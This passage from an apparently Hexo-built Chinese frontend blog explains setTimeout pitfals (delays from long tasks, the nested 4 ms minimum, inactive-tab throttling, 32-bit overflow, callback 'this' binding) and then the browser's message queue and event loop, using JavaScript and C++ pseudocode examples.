<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearTimeout(timer_id)</span><br></pre></td></tr></table></figure>
<p>其实浏览器内部实现取消定时器的操作也是非常简单的，就是直接从<code>delayed_incoming_queue</code>延迟队列中，通过 ID 查找到对应的任务，然后再将其从队列中删除掉就可以了。</p>
<h1 id="使用-setTimeout-的一些注意事项"><a href="#使用-setTimeout-的一些注意事项" class="headerlink" title="使用 setTimeout 的一些注意事项"></a>使用 setTimeout 的一些注意事项</h1><h2 id="1-如果当前任务执行时间过久，会影响延迟到期定时器任务的执行"><a href="#1-如果当前任务执行时间过久，会影响延迟到期定时器任务的执行" class="headerlink" title="1. 如果当前任务执行时间过久，会影响延迟到期定时器任务的执行"></a>1. 如果当前任务执行时间过久，会影响延迟到期定时器任务的执行</h2><p>在使用<code>setTimeout</code>的时候，有很多因素会导致回调函数执行比设定的预期值要久，其中一个就是当前任务执行时间过久从而导致定时器设置的任务被延后执行。我们先看下面这段代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">bar</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;bar&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(bar, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5000</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">5</span>+<span class="number">8</span>+<span class="number">8</span>+<span class="number">8</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">foo</span>()</span><br></pre></td></tr></table></figure>
<p>这段代码中，在执行<code>foo</code>函数的时候使用<code>setTimeout</code>设置了一个 0 延时的回调任务，设置好回调任务后，<code>foo</code>函数会继续执行 5000 次<code>for</code>循环。</p>
<p>通过<code>setTimeout</code>设置的回调任务被放入了消息队列中并且等待下一次执行，这里并不是立即执行的；要执行消息队列中的下个任务，需要等待当前的任务执行完成，由于当前这段代码要执行 5000 次的<code>for</code>循环，所以当前这个任务的执行时间会比较久一点。这势必会影响到下个任务的执行时间。</p>
<p>你也可以打开<code>Performance</code>来看看其执行过程，如下图所示：</p>


<p>从图中可以看到，执行<code>foo</code>函数所消耗的时长是 500 毫秒，这也就意味着通过<code>setTimeout</code>设置的任务会被推迟到 500 毫秒以后再去执行，而设置<code>setTimeout</code>的回调延迟时间是 0。</p>
<h2 id="2-如果-setTimeout-存在嵌套调用，那么系统会设置最短时间间隔为-4-毫秒"><a href="#2-如果-setTimeout-存在嵌套调用，那么系统会设置最短时间间隔为-4-毫秒" class="headerlink" title="2. 如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒"></a>2. 如果 setTimeout 存在嵌套调用，那么系统会设置最短时间间隔为 4 毫秒</h2><p>也就是说在定时器函数里面嵌套调用定时器，也会延长定时器的执行时间，可以先看下面的这段代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">cb</span>(<span class="params"></span>) &#123; <span class="built_in">setTimeout</span>(cb, <span class="number">0</span>); &#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(cb, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<p>你还是可以通过<code>Performance</code>来记录下这段代码的执行过程，如下图所示：</p>


<p>上图中的竖线就是定时器的函数回调过程，从图中可以看出，前面五次调用的时间间隔比较小，嵌套调用超过五次以上，后面每次的调用最小时间间隔是 4 毫秒。之所以出现这样的情况，是因为在 Chrome 中，定时器被嵌套调用 5 次以上，系统会判断该函数方法被阻塞了，如果定时器的调用时间间隔小于 4 毫秒，那么浏览器会将每次调用的时间间隔设置为 4 毫秒。</p>
<p>所以，一些实时性较高的需求就不太适合使用<code>setTimeout</code>了，比如你用<code>setTimeout</code>来实现 JavaScript 动画就不是一个很好的主意。</p>
<h2 id="3-未激活的页面，setTimeout-执行最小间隔是-1000-毫秒"><a href="#3-未激活的页面，setTimeout-执行最小间隔是-1000-毫秒" class="headerlink" title="3. 未激活的页面，setTimeout 执行最小间隔是 1000 毫秒"></a>3. 未激活的页面，setTimeout 执行最小间隔是 1000 毫秒</h2><p>除了前面的 4 毫秒延迟，还有一个很容易被忽略的地方，那就是未被激活的页面中定时器最小值大于 1000 毫秒，也就是说，如果标签不是当前的激活标签，那么定时器最小的时间间隔是 1000 毫秒，目的是为了优化后台页面的加载损耗以及降低耗电量。这一点你在使用定时器的时候要注意。</p>
<h2 id="4-延时执行时间有最大值"><a href="#4-延时执行时间有最大值" class="headerlink" title="4. 延时执行时间有最大值"></a>4. 延时执行时间有最大值</h2><p>除了要了解定时器的回调函数时间比实际设定值要延后之外，还有一点需要注意下，那就是 Chrome、Safari、Firefox 都是以 32 个<code>bit</code>来存储延时值的，<code>32bit</code>最大只能存放的数字是 2147483647 毫秒，这就意味着，如果<code>setTimeout</code>设置的延迟值大于 2147483647 毫秒（大约 24.8 天）时就会溢出，这导致定时器会被立即执行。你可以运行下面这段代码：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">showName</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot; test &quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> timerID = <span class="built_in">setTimeout</span>(showName,<span class="number">2147483648</span>);<span class="comment">// 会被理解调用执行</span></span><br></pre></td></tr></table></figure>
<p>运行后可以看到，这段代码是立即被执行的。但如果将延时值修改为小于 2147483647 毫秒的某个值，那么执行时就没有问题了。</p>
<h2 id="5-使用-setTimeout-设置的回调函数中的-this-不符合直觉"><a href="#5-使用-setTimeout-设置的回调函数中的-this-不符合直觉" class="headerlink" title="5. 使用 setTimeout 设置的回调函数中的 this 不符合直觉"></a>5. 使用 setTimeout 设置的回调函数中的 this 不符合直觉</h2><p>如果被<code>setTimeout</code>推迟执行的回调函数是某个对象的方法，那么该方法中的<code>this</code>关键字将指向全局环境，而不是定义时所在的那个对象。你可以看下面这段代码的执行结果：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name= <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">MyObj</span> = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">showName</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="title class_">MyObj</span>.<span class="property">showName</span>, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>这里输出的是 1，因为这段代码在编译的时候，执行上下文中的<code>this</code>会被设置为全局<code>window</code>，如果是严格模式，会被设置为<code>undefined</code>。</p>
<p>那么该怎么解决这个问题呢？通常可以使用下面这两种方法。</p>
<p>第一种是将<code>MyObj.showName</code>放在匿名函数中执行，如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title class_">MyObj</span>.<span class="title function_">showName</span>()</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"><span class="comment">// 或者 function 函数</span></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title class_">MyObj</span>.<span class="title function_">showName</span>();</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>第二种是使用<code>bind</code>方法，将<code>showName</code>绑定在<code>MyObj</code>上面，代码如下所示：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="title class_">MyObj</span>.<span class="property">showName</span>.<span class="title function_">bind</span>(<span class="title class_">MyObj</span>), <span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>首先，为了支持定时器的实现，浏览器增加了延时队列。<br>其次，由于消息队列排队和一些系统级别的限制，通过<code>setTimeout</code>设置的回调任务并非总是可以实时地被执行，这样就不能满足一些实时性要求较高的需求了。<br>最后，在定时器中使用过程中，还存在一些陷阱，需要你多加注意。</p>
<p>函数<code>setTimeout</code>在时效性上面有很多先天的不足，所以对于一些时间精度要求比较高的需求，应该有针对性地采取一些其他的方案。</p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS/" rel="tag">JS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6/" rel="tag">JS事件循环机制</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
    <article
  id="post-前端/js/深入/JS事件循环机制——消息队列和事件循环"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/"
    >JS事件循环机制——消息队列和事件循环</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/" class="article-date">
  <time datetime="2019-12-01T10:02:21.000Z" itemprop="datePublished">2019-12-01</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a> / <a class="article-category-link" href="/categories/%E5%89%8D%E7%AB%AF/JS/">JS</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <p>每个渲染进程都有一个主线程，并且主线程非常繁忙，既要处理 DOM，又要计算样式，还要处理布局，同时还需要处理 JavaScript 任务以及各种输入事件。要让这么多不同类型的任务在主线程中有条不紊地执行，这就需要一个系统来统筹调度这些任务，这个统筹调度系统就是消息队列和事件循环系统。</p>
<h1 id="使用单线程处理安排好的任务"><a href="#使用单线程处理安排好的任务" class="headerlink" title="使用单线程处理安排好的任务"></a>使用单线程处理安排好的任务</h1><p>我们先从最简单的场景讲起，比如有如下一系列的任务：</p>
<ul>
<li>任务 1：<code>1+2</code></li>
<li>任务 2：<code>20/5</code></li>
<li>任务 3：<code>7*8</code></li>
<li>任务 4：打印出任务 1、任务 2、任务 3 的运算结果</li>
</ul>
<p>现在要在一个线程中去执行这些任务，通常我们会这样编写代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainThread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> num1 = <span class="number">1</span> + <span class="number">2</span>; <span class="comment">// 任务 1</span></span><br><span class="line">  <span class="type">int</span> num2 = <span class="number">20</span> / <span class="number">5</span>; <span class="comment">// 任务 2</span></span><br><span class="line">  <span class="type">int</span> num3 = <span class="number">7</span> * <span class="number">8</span>; <span class="comment">// 任务 3</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;最终计算的值为:%d,%d,%d&quot;</span>, num, num2, num3)； <span class="comment">// 任务 4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面的执行代码中，我们把所有任务代码按照顺序写进主线程里，等线程执行时，这些任务会按照顺序在线程中依次被执行；等所有任务执行完成之后，线程会自动退出。可以参考下图来直观地理解下其执行过程：</p>
<img src="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img1.png" class="" title="第一版：线程的一次执行">

<h1 id="在线程运行过程中处理新任务"><a href="#在线程运行过程中处理新任务" class="headerlink" title="在线程运行过程中处理新任务"></a>在线程运行过程中处理新任务</h1><p>但并不是所有的任务都是在执行之前统一安排好的，大部分情况下，新的任务是在线程运行过程中产生的。比如在线程执行过程中，又接收到了一个新的任务要求计算<code>10+2</code>，那上面那种方式就无法处理这种情况了。</p>
<p>要想在线程运行过程中，能接收并执行新的任务，就需要采用事件循环机制。我们可以通过一个<code>for</code>循环语句来监听是否有新的任务，如下面的示例代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//GetInput</span></span><br><span class="line"><span class="comment">// 等待用户从键盘输入一个数字，并返回该输入的数字</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetInput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> input_number = <span class="number">0</span>;</span><br><span class="line">  cout&lt;&lt;<span class="string">&quot; 请输入一个数:&quot;</span>;</span><br><span class="line">  cin&gt;&gt;input_number;</span><br><span class="line">  <span class="keyword">return</span> input_number;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 主线程 (Main Thread)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainThread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    <span class="type">int</span> first_num = <span class="built_in">GetInput</span>()；</span><br><span class="line">    <span class="type">int</span> second_num = <span class="built_in">GetInput</span>()；</span><br><span class="line">    result_num = first_num + second_num;</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot; 最终计算的值为:%d&quot;</span>,result_num)；</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>相较于第一版的线程，这一版的线程做了两点改进。</p>
<ul>
<li>第一点引入了循环机制，具体实现方式是在线程语句最后添加了一个<code>for</code>循环语句，线程会一直循环执行。</li>
<li>第二点是引入了事件，可以在线程运行过程中，等待用户输入的数字，等待过程中线程处于暂停状态，一旦接收到用户输入的信息，那么线程会被激活，然后执行相加运算，最后输出结果。</li>
</ul>
<p>通过引入事件循环机制，就可以让该线程“活”起来了，我们每次输入两个数字，都会打印出两数字相加的结果，你可以结合下图来参考下这个改进版的线程：</p>
<img src="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img2.png" class="" title="第二版：在线程中引入事件循环">

<h1 id="处理其他线程发送过来的任务"><a href="#处理其他线程发送过来的任务" class="headerlink" title="处理其他线程发送过来的任务"></a>处理其他线程发送过来的任务</h1><p>上面我们改进了线程的执行方式，引入了事件循环机制，可以让其在执行过程中接受新的任务。不过在第二版的线程模型中，所有的任务都是来自于线程内部的，如果另外一个线程想让主线程执行一个任务，利用第二版的线程模型是无法做到的。</p>
<p>那下面我们就来看看其他线程是如何发送消息给渲染主线程的，具体形式你可以参考下图：</p>
<img src="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img3.png" class="" title="渲染进程线程之间发送任务">

<p>从上图可以看出，渲染主线程会频繁接收到来自于 IO 线程的一些任务，接收到这些任务之后，渲染进程就需要着手处理，比如接收到资源加载完成的消息后，渲染进程就要着手进行 DOM 解析了；接收到鼠标点击的消息后，渲染主线程就要开始执行相应的 JavaScript 脚本来处理该点击事件。</p>
<p>那么如何设计好一个线程模型，能让其能够接收其他线程发送的消息呢？</p>
<p>一个通用模式是使用消息队列。</p>
<img src="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img4.png" class="">

<p>从图中可以看出，消息队列是一种数据结构，可以存放要执行的任务。它符合队列“先进先出”的特点，也就是说要添加任务的话，添加到队列的尾部；要取出任务的话，从队列头部去取。</p>
<p>有了队列之后，我们就可以继续改造线程模型了，改造方案如下图所示：</p>
<img src="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img5.png" class="" title="第三版线程模型：队列 + 循环">

<p>从上图可以看出，我们的改造可以分为下面三个步骤：</p>
<ul>
<li>添加一个消息队列；</li>
<li>IO 线程中产生的新任务添加进消息队列尾部；</li>
<li>渲染主线程会循环地从消息队列头部中读取任务，执行任务。</li>
</ul>
<p>有了这些步骤之后，那么接下来我们就可以按步骤使用代码来实现第三版的线程模型。</p>
<p>首先，构造一个队列。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TaskQueue</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">  <span class="function">Task <span class="title">takeTask</span><span class="params">()</span></span>; <span class="comment">// 取出队列头部的一个任务</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">pushTask</span><span class="params">(Task task)</span></span>; <span class="comment">// 添加一个任务到队列尾部</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>接下来，改造主线程，让主线程从队列中读取任务：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TaskQueue task_queue；</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ProcessTask</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainThread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    Task task = task_queue.<span class="built_in">takeTask</span>();</span><br><span class="line">    <span class="built_in">ProcessTask</span>(task);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面的代码中，我们添加了一个消息队列的对象，然后在主线程的<code>for</code>循环代码块中，从消息队列中读取一个任务，然后执行该任务，主线程就这样一直循环往下执行，因此只要消息队列中有任务，主线程就会去执行。</p>
<p>主线程的代码就这样改造完成了。这样改造后，主线程执行的任务都全部从消息队列中获取。所以如果有其他线程想要发送任务让主线程去执行，只需要将任务添加到该消息队列中就可以了，添加任务的代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Task clickTask;</span><br><span class="line">task_queue.<span class="built_in">pushTask</span>(clickTask)</span><br></pre></td></tr></table></figure>
<p>由于是多个线程操作同一个消息队列，所以在添加任务和取出任务时还会加上一个同步锁。</p>
<h1 id="处理其他进程发送过来的任务"><a href="#处理其他进程发送过来的任务" class="headerlink" title="处理其他进程发送过来的任务"></a>处理其他进程发送过来的任务</h1><p>通过使用消息队列，我们实现了线程之间的消息通信。在 Chrome 中，跨进程之间的任务也是频繁发生的，那么如何处理其他进程发送过来的任务？你可以参考下图：</p>
<img src="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img6.png" class="" title="跨进程发送消息">

<p>从图中可以看出，渲染进程专门有一个 IO 线程用来接收其他进程传进来的消息，接收到消息之后，会将这些消息组装成任务发送给渲染主线程，后续的步骤就和前面讲解的“处理其他线程发送的任务”一样了。</p>
<h1 id="消息队列中的任务类型"><a href="#消息队列中的任务类型" class="headerlink" title="消息队列中的任务类型"></a>消息队列中的任务类型</h1><p>现在你知道页面主线程是如何接收外部任务的了，那接下来我们再来看看消息队列中的任务类型有哪些。如输入事件（鼠标滚动、点击、移动）、微任务、文件读写、WebSocket、JavaScript 定时器等等。</p>
<p>除此之外，消息队列中还包含了很多与页面相关的事件，如 JavaScript 执行、解析 DOM、样式计算、布局计算、CSS 动画等。</p>
<p>以上这些事件都是在主线程中执行的，所以在编写 Web 应用时，你还需要衡量这些事件所占用的时长，并想办法解决单个任务占用主线程过久的问题。</p>
<h1 id="如何安全退出"><a href="#如何安全退出" class="headerlink" title="如何安全退出"></a>如何安全退出</h1><p>当页面主线程执行完成之后，又该如何保证页面主线程能够安全退出呢？Chrome 是这样解决的，确定要退出当前页面时，页面主线程会设置一个退出标志的变量，在每次执行完一个任务时，判断是否有设置退出标志。</p>
<p>如果设置了，那么就直接中断当前的所有任务，退出线程，你可以参考下面代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">TaskQueue task_queue；</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ProcessTask</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">bool</span> keep_running = <span class="literal">true</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MainThread</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">    Task task = task_queue.<span class="built_in">takeTask</span>();</span><br><span class="line">    <span class="built_in">ProcessTask</span>(task);</span><br><span class="line">    <span class="keyword">if</span>(!keep_running) <span class="comment">// 如果设置了退出标志，那么直接退出线程循环</span></span><br><span class="line">      <span class="keyword">break</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="页面使用单线程的缺点"><a href="#页面使用单线程的缺点" class="headerlink" title="页面使用单线程的缺点"></a>页面使用单线程的缺点</h1><p>页面线程所有执行的任务都来自于消息队列。消息队列是“先进先出”的属性，也就是说放入队列中的任务，需要等待前面的任务被执行完，才会被执行。鉴于这个属性，就有如下两个问题需要解决。</p>
<h2 id="第一个问题是如何处理高优先级的任务。"><a href="#第一个问题是如何处理高优先级的任务。" class="headerlink" title="第一个问题是如何处理高优先级的任务。"></a>第一个问题是如何处理高优先级的任务。</h2><p>比如一个典型的场景是监控 DOM 节点的变化情况（节点的插入、修改、删除等动态变化），然后根据这些变化来处理相应的业务逻辑。一个通用的设计的是，利用 JavaScript 设计一套监听接口，当变化发生时，渲染引擎同步调用这些接口，这是一个典型的观察者模式。</p>
<p>不过这个模式有个问题，因为 DOM 变化非常频繁，如果每次发生变化的时候，都直接调用相应的 JavaScript 接口，那么这个当前的任务执行时间会被拉长，从而导致执行效率的下降。</p>
<p>如果将这些 DOM 变化做成异步的消息事件，添加到消息队列的尾部，那么又会影响到监控的实时性，因为在添加到消息队列的过程中，可能前面就有很多任务在排队了。</p>
<p>这也就是说，如果 DOM 发生变化，采用同步通知的方式，会影响当前任务的执行效率；如果采用异步方式，又会影响到监控的实时性。</p>
<p>那该如何权衡效率和实时性呢？</p>
<p>针对这种情况，微任务就应用而生了，下面我们来看看微任务是如何权衡效率和实时性的。</p>
<p>通常我们把消息队列中的任务称为宏任务，每个宏任务中都包含了一个微任务队列，在执行宏任务的过程中，如果 DOM 有变化，那么就会将该变化添加到微任务列表中，这样就不会影响到宏任务的继续执行，因此也就解决了执行效率的问题。</p>
<p>等宏任务中的主要功能都直接完成之后，这时候，渲染引擎并不着急去执行下一个宏任务，而是执行当前宏任务中的微任务，因为 DOM 变化的事件都保存在这些微任务队列中，这样也就解决了实时性问题。</p>
<h2 id="第二个是如何解决单个任务执行时长过久的问题。"><a href="#第二个是如何解决单个任务执行时长过久的问题。" class="headerlink" title="第二个是如何解决单个任务执行时长过久的问题。"></a>第二个是如何解决单个任务执行时长过久的问题。</h2><p>因为所有的任务都是在单线程中执行的，所以每次只能执行一个任务，而其他任务就都处于等待状态。如果其中一个任务执行时间过久，那么下一个任务就要等待很长时间。</p>
<img src="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img7.png" class="" title="单个任务执行时间过久">

<p>从图中你可以看到，如果在执行动画过程中，其中有个 JavaScript 任务因执行时间过久，占用了动画单帧的时间，这样会给用户制造了卡顿的感觉，这当然是极不好的用户体验。针对这种情况，JavaScript 可以通过回调功能来规避这种问题，也就是让要执行的 JavaScript 任务滞后执行。</p>
<h1 id="实践：浏览器页面是如何运行的"><a href="#实践：浏览器页面是如何运行的" class="headerlink" title="实践：浏览器页面是如何运行的"></a>实践：浏览器页面是如何运行的</h1><p>你可以打开开发者工具，点击<code>Performance</code>标签，选择左上角的<code>start porfiling and load page</code>来记录整个页面加载过程中的事件执行情况，如下图所示：</p>
<img src="/2019/12/01/%E5%89%8D%E7%AB%AF/js/%E6%B7%B1%E5%85%A5/JS%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E6%9C%BA%E5%88%B6%E2%80%94%E2%80%94%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%E5%92%8C%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF/img8.png" class="" title="Performance 页面">

